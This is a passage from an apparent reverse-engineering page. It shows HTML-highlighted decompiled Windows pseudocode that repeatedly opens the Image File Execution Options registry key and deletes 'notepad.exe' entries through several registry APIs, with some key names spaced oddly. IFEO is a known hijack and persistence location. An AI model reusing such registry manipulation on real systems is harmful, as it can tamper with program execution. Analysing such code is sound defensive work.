style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Executio n Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000320 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002ed6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteKeyW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000320 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002ee9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000318 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002f1b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Execution  Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000318 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002f35\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteValueA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000318 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002f48\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000310 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002f7a\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Executio n Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000310 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002f94\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteValueW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000310 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002fa7\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000308 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002fd9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Execution  Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000308 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002ff3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteTreeA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"notepad.exe\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000308 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003006\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000300 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> 